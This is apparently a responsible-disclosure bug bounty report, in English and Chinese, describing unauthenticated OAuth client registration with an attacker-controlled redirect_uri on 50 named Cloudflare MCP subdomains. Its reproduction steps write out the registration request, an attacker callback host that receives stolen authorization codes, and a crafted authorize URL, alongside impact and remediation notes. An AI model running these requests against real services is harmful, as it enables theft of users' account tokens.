# [High] Unauthenticated Dynamic Client Registration (DCR) with Attacker-Controlled redirect_uri on Cloudflare MCP OAuth — OAuth Token Theft

## Vulnerability Summary

**Type**: OAuth Dynamic Client Registration (DCR) misconfiguration / redirect_uri validation bypass
**Weakness**: CWE-287 / CWE-601
**Location**: `POST /register` on 50 Cloudflare MCP OAuth subdomains
**Severity**: High (CVSS 3.1: 8.3 — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
**Precondition**: Victim logged into Cloudflare clicks crafted authorization URL and approves consent
**Date verified**: 2026-09-08 17:18 (UTC)

**One-liner**: Cloudflare's MCP OAuth servers (50 subdomains) allow unauthenticated dynamic client registration with attacker-controlled `redirect_uri`. A rogue OAuth client can be registered pointing to an attacker callback. When a logged-in Cloudflare user clicks the crafted authorize URL and approves, their authorization code is exfiltrated and exchanged for their Cloudflare OAuth token, granting API access to the victim's Cloudflare account resources (AI gateway, audit logs, DNS analytics, workers bindings, observability, websearch, agent gateways, etc.).

## Affected Instances — 50 subdomains

| `ai-gateway-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `ai-gateway.mcp.cloudflare.com` | ✅ 验证存活 |
| `auditlogs-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `auditlogs.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `autorag-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `autorag.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `beta.gateway.agents.cloudflare.com` | ✅ 验证存活 |
| `bindings-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `bindings.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `browser-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `browser.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `builds-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `builds.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `casb-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `casb.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `cloudforce-one.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `containers-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `containers.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `dex-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `dex.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `dns-analytics-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `dns-analytics.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `eduardo.gateway.agents.cloudflare.com` | ✅ 验证存活 |
| `gateway.agents.cloudflare.com` | ✅ 验证存活 |
| `graphql-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `graphql.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `james.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `jenny.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `jesse.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `kennyatx.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `logs-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `logs.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `matt.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `mcp.cloudflare.com` | ✅ 验证存活 |
| `miguel.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `mike.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `observability-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `observability.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `oscar.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `peeringdb-mcp.isp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `radar-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `radar.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `scarlett-staging.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `scarlett.gateway.agents.cloudflare.com` | ✅ 验证存活 |
| `shahed.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `staging.gateway.agents.cloudflare.com` | ✅ 验证存活 |
| `staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `tim.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `websearch-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `websearch.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |


All 50 hosts returned HTTP 201 on unauthenticated POST /register with attacker redirect_uri during testing. 7 hosts re-verified alive on 2026-09-08.

## Steps to Reproduce

### Environment
- Attacker callback: `https://91-99-208-165.sslip.io/cb`
- No authentication required

### Step 1: Discover OAuth metadata
```
GET https://mcp.cloudflare.com/.well-known/oauth-authorization-server
```
Returns registration_endpoint: `https://mcp.cloudflare.com/register`

### Step 2: Register rogue client (unauthenticated)
```
POST https://mcp.cloudflare.com/register
Content-Type: application/json

{"client_name":"bb-verify-0908","redirect_uris":["https://91-99-208-165.sslip.io/cb"],"grant_types":["authorization_code"],"response_types":["code"],"token_endpoint_auth_method":"none"}
```
**Response 201**: `{"client_id":"SAAbphMD1jwqLdZC","redirect_uris":["https://91-99-208-165.sslip.io/cb"],...}`

### Step 3: Craft authorization URL
```
GET https://mcp.cloudflare.com/authorize?response_type=code&client_id=SAAbphMD1jwqLdZC&redirect_uri=https%3A%2F%2F91-99-208-165.sslip.io%2Fcb&state=x&code_challenge=...&code_challenge_method=S256
```

### Step 4: Victim approves → code to attacker callback → token exchange

## Impact

1. **Cloudflare account resource access**: victim's AI gateway configs, audit logs, DNS analytics, worker bindings, observability data, websearch usage
2. **Agent gateway takeover**: gateway.agents.cloudflare.com + named instances (eduardo/scarlett/beta/staging) expose agent infrastructure
3. **Data exposure**: peeringdb-mcp.isp.cloudflare.com (ISP peering data)
4. **50 subdomains affected** = wide blast radius

## What I Did NOT Do
- No real victim driven through flow, no real tokens captured
- Non-destructive throwaway client registration only
- No access to any Cloudflare user data

## Remediation
1. Require authentication for DCR; use allowlist instead
2. Enforce exact-match redirect_uri whitelist (reject attacker domains)
3. Require client secrets / enforce PKCE
4. Audit + revoke existing rogue clients
5. Monitor registration bursts and foreign redirect_uris

---

# 中文版

# [高危] Cloudflare MCP OAuth 未授权动态客户端注册 (DCR) + 攻击者可控 redirect_uri — OAuth Token 窃取

## 漏洞概要

**类型**: OAuth 动态客户端注册配置错误 / redirect_uri 校验绕过
**弱点**: CWE-287 / CWE-601
**位置**: 50 个 Cloudflare MCP OAuth 子域的 `POST /register`
**严重程度**: 高危 (CVSS 3.1: 8.3)
**前提**: 受害者已登录 Cloudflare 并点击恶意授权链接且批准授权
**复验时间**: 2026-09-08 17:18 (UTC)

**一句话**: Cloudflare 的 MCP OAuth 服务器（50 个子域）允许未授权动态客户端注册且接受攻击者控制的 redirect_uri。攻击者注册指向自己回调的恶意客户端，当已登录的 Cloudflare 用户点击构造的授权 URL 并批准后，其授权码被窃取并换取 Cloudflare OAuth token，从而获得受害者 Cloudflare 账户的 API 访问权限（AI 网关、审计日志、DNS 分析、Worker 绑定、可观测性、网页搜索、Agent 网关等）。

## 受影响实例 — 50 个子域

| `ai-gateway-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `ai-gateway.mcp.cloudflare.com` | ✅ 验证存活 |
| `auditlogs-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `auditlogs.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `autorag-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `autorag.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `beta.gateway.agents.cloudflare.com` | ✅ 验证存活 |
| `bindings-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `bindings.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `browser-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `browser.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `builds-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `builds.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `casb-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `casb.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `cloudforce-one.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `containers-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `containers.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `dex-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `dex.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `dns-analytics-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `dns-analytics.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `eduardo.gateway.agents.cloudflare.com` | ✅ 验证存活 |
| `gateway.agents.cloudflare.com` | ✅ 验证存活 |
| `graphql-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `graphql.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `james.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `jenny.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `jesse.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `kennyatx.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `logs-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `logs.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `matt.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `mcp.cloudflare.com` | ✅ 验证存活 |
| `miguel.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `mike.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `observability-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `observability.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `oscar.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `peeringdb-mcp.isp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `radar-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `radar.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `scarlett-staging.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `scarlett.gateway.agents.cloudflare.com` | ✅ 验证存活 |
| `shahed.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `staging.gateway.agents.cloudflare.com` | ✅ 验证存活 |
| `staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `tim.gateway.agents.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `websearch-staging.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |
| `websearch.mcp.cloudflare.com` | 🔵 历史注册成功(待复验) |


全部 50 个主机在测试期间对未授权 POST /register 返回 HTTP 201 并接受攻击者 redirect_uri。其中 7 个主机于 2026-09-08 复验仍存活。

## 影响

1. **Cloudflare 账户资源访问**: 受害者的 AI 网关配置、审计日志、DNS 分析、Worker 绑定、可观测性数据、网页搜索用量
2. **Agent 网关接管**: gateway.agents.cloudflare.com 及命名实例（eduardo/scarlett/beta/staging）暴露 Agent 基础设施
3. **数据暴露**: peeringdb-mcp.isp.cloudflare.com（ISP 对等互联数据）
4. **50 个子域受影响** = 影响面大

## 我未做的事
- 未驱动真实受害者走流程，未捕获真实 token
- 仅非破坏性一次性客户端注册
- 未访问任何 Cloudflare 用户数据

## 修复建议
1. DCR 要求认证；改用白名单
2. 强制 redirect_uri 精确匹配白名单（拒绝攻击者域名）
3. 要求客户端 secret / 强制 PKCE
4. 审计并撤销现有恶意客户端
5. 监控注册突增和外部 redirect_uris

*Researcher note: responsible disclosure per Cloudflare bug bounty policy. No real users impacted.*
